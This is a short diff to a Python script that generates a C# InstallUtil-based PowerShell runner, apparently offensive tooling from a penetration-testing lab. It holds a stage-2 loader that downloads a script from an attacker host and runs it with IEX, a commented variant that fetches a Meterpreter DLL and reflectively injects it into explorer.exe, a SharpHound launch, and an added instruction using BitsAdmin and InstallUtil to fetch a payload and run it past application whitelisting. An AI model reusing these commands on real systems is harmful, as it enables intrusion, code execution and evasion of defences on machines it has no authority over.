@@ -9,6 +9,7 @@ BASE_FILENAME = 'win_installutil_ps_runner'
 
 # Stage2 loader:
 PS_CMD = f"(New-Object System.Net.WebClient).DownloadString('http://{LHOST}/run.txt') | IEX"
+#PS_CMD = r"cmd.exe /c C:\\windows\\tasks\\SharpHound.exe"
 # PS_CMD = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.49.65/InvokeReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; InvokeReflectivePEInjection -PEBytes $bytes -ProcId $procid";
 
 def generate():
@@ -71,6 +72,7 @@ def main():
   compile() 
 
   print("Wrote to: "+ BASE_FILENAME + ".cs")
+  print("Run with: cmd.exe /c BitsAdmin /Transfer myJob http://192.168.49.65/Bypass C:\\Windows\\tasks\\bp && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp")
   print("Compile DLL runner")
 
 if __name__ == "__main__":
